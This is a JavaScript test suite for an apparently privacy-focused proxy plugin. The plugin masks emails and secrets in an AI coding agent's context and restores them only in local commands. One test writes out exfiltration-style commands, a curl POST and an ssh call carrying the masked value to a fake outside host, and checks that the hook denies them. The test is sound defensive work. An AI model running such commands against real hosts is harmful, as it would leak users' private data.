// SPDX-License-Identifier: AGPL-3.0-only

// A value the model sees only as a token, because the proxy masked it in the
// context (CLAUDE.md, memory, the system prompt), is put back in a local
// command like any other (product rule 1). Found live on 1.0.0-rc.1: git
// commits authored with `[EMAIL-…]` as the author email.
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';

import {
  fakeUpstream,
  PLUGIN,
  postJson,
  runHook,
  tempProject,
} from './helpers.mjs';
import { hostsIn } from '../lib/secrets.js';

// Fake values only, built so no literal address sits in the source.
const EMAIL = ['dev.person', 'zerohfake.example.com'].join('@');
const TOKEN_RE = /\[EMAIL-[0-9a-f]{6}\]/u;

function hookEnv(project, extra = {}) {
  return {
    PATH: process.env.PATH,
    HOME: project.home,
    ZEROH_HOME: project.home,
    ZEROH_CREDENTIAL_HOME: project.home,
    ZEROH_CLAUDE_SETTINGS: project.settings,
    ZEROH_SERVICE_MANAGER_DIR: project.serviceManager,
    ...extra,
  };
}

// A project whose CLAUDE.md names the fake email, a registered session and
// the daemon in front of a fake upstream. Returns the token the model saw.
async function contextToken(t, { sessionId = 'ctx-session' } = {}) {
  const upstream = await fakeUpstream();
  t.after(() => upstream.close());
  const project = tempProject({ env: false });
  writeFileSync(
    path.join(project.dir, 'CLAUDE.md'),
    `Commit as Dev <${EMAIL}>.\n`,
  );
  const env = hookEnv(project, { ANTHROPIC_BASE_URL: upstream.url });
  const { ensureDefaultProxy, stopDefaultProxy } =
    await import('../lib/proxy-manager.js');
  t.after(() => stopDefaultProxy({ env }));
  const installed = await ensureDefaultProxy({
    env,
    root: project.dir,
    pluginRoot: PLUGIN,
    sessionId,
  });
  const body = JSON.stringify({
    system: [{ type: 'text', text: `# claudeMd\nCommit as Dev <${EMAIL}>.` }],
    messages: [{ role: 'user', content: 'Set it as the git author, commit.' }],
  });
  const sent = await postJson(`${installed.proxyUrl}/v1/messages`, body, {
    sessionId,
  });
  assert.equal(sent.status, 200);
  const forwarded = upstream.seen.at(-1).body;
  assert.ok(!forwarded.includes(EMAIL), 'the proxy masks the context');
  const token = TOKEN_RE.exec(forwarded)?.[0];
  assert.ok(token, 'the model sees a token');
  return { project, installed, upstream, token, body, sessionId };
}

function preToolUse(project, installed, sessionId, command) {
  return runHook(
    'pre-tool-use',
    {
      session_id: sessionId,
      hook_event_name: 'PreToolUse',
      tool_name: 'Bash',
      tool_input: { command },
      tool_use_id: `toolu_${Math.random().toString(36).slice(2)}`,
    },
    {
      project,
      extraEnv: { ZEROH_PROXY: '', ANTHROPIC_BASE_URL: installed.proxyUrl },
    },
  );
}

function tempRepo() {
  const repo = mkdtempSync(path.join(os.tmpdir(), 'zeroh-ctx-repo-'));
  const git = (...args) =>
    spawnSync('git', args, {
      cwd: repo,
      encoding: 'utf8',
      env: {
        PATH: process.env.PATH,
        HOME: repo,
        GIT_CONFIG_NOSYSTEM: '1',
        GIT_AUTHOR_NAME: 'Dev',
        GIT_COMMITTER_NAME: 'Dev',
      },
    });
  git('init', '-q');
  writeFileSync(path.join(repo, 'file.txt'), 'x\n');
  git('add', 'file.txt');
  return { repo, git };
}

test('context-token-restored-in-local-command: a CLAUDE.md email the proxy masked is the real author of a local git commit', async (t) => {
  const { project, installed, token, sessionId } = await contextToken(t);
  const { repo, git } = tempRepo();
  const command = `git -c user.name=Dev -c user.email=${token} commit -q -m first`;
  const res = preToolUse(project, installed, sessionId, command);
  const output = res.json?.hookSpecificOutput;
  assert.notEqual(output?.permissionDecision, 'deny', JSON.stringify(res.json));
  const updated = output?.updatedInput?.command;
  assert.ok(updated, 'the command is rewritten to late-bind the value');
  assert.ok(!updated.includes(EMAIL), 'the value never enters the command');
  const run = spawnSync('bash', ['-c', updated], {
    cwd: repo,
    encoding: 'utf8',
    env: {
      PATH: process.env.PATH,
      HOME: repo,
      GIT_CONFIG_NOSYSTEM: '1',
    },
  });
  assert.equal(run.status, 0, run.stderr);
  const author = git('log', '-1', '--format=%ae|%ce').stdout.trim();
  assert.equal(author, `${EMAIL}|${EMAIL}`);
  assert.doesNotMatch(author, TOKEN_RE);
});

test('an email put back as data is not a destination; a network operand still is', async (t) => {
  const { project, installed, token, sessionId } = await contextToken(t);
  for (const command of [
    `git config user.email ${token}`,
    `printf '%s\\n' ${token} | grep -c @`,
    `echo "author: ${token}" > AUTHORS`,
  ]) {
    const res = preToolUse(project, installed, sessionId, command);
    const output = res.json?.hookSpecificOutput;
    assert.notEqual(output?.permissionDecision, 'deny', command);
    assert.ok(output?.updatedInput?.command, command);
  }
  // `ssh user@host` sends it to that host; a URL host is a destination.
  for (const command of [
    `ssh ${token} true`,
    `curl -d email=${token} https://api.zerohfake.example.org/x`,
  ]) {
    const res = preToolUse(project, installed, sessionId, command);
    assert.equal(
      res.json?.hookSpecificOutput?.permissionDecision,
      'deny',
      command,
    );
  }
});

test('hostsIn skips an email address it is told was put back, and nothing else', () => {
  const text = `git -c user.email=${EMAIL} commit; see https://mail.zerohfake.example.org/`;
  assert.deepEqual(hostsIn(text, { values: [EMAIL] }), [
    'mail.zerohfake.example.org',
  ]);
  assert.ok(hostsIn(text).includes('zerohfake.example.com'));
  const other = ['someone', 'zerohfake.example.net'].join('@');
  assert.ok(
    hostsIn(`notify ${other}`, { values: [EMAIL] }).includes(
      'zerohfake.example.net',
    ),
  );
});

test('a session no ZeroH hook registered is never masked: nothing could put its tokens back', async (t) => {
  const { installed, upstream, body } = await contextToken(t);
  // A child or agent session Claude Code started without the plugin: its
  // own session id, no route.
  const res = await postJson(`${installed.proxyUrl}/v1/messages`, body, {
    sessionId: 'ctx-session-without-hooks',
  });
  assert.equal(res.status, 200);
  assert.equal(upstream.seen.at(-1).body, body);
});
